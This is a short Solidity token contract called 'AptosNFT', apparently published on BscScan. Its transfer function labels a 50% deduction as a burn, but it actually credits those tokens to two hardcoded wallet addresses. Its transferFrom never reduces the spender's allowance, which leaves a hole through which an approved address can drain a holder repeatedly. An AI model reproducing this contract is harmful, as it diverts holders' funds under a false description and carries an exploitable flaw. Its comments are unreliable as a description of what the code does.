/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract Token {
    
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    
    uint public totalSupply = 10000 * 10 ** 18;
    string public name = "AptosNFT";
    string public symbol = "Aptos";
    uint public decimals = 18;
    
    uint public burnRate = 50; //Queima x% dos token transferidos de uma carteira para outra
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    address public adressMarketing = 0x260a196De99B2056d6502741C682e6885a1Bd96e;
    address public adressFinanc = 0xa5Ad63333A557EdCd799991771709D0b386567A8;

    constructor() {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'Saldo insuficiente (balance too low)');
        uint valueToBurn = (value * burnRate / 100);
        balances[to] += value - valueToBurn;
        balances[0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db] += valueToBurn/2;
        balances[0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB] += valueToBurn/2;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'Saldo insuficiente (balance too low)');
        require(allowance[from][msg.sender] >= value, 'Sem permissao (allowance too low)');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
}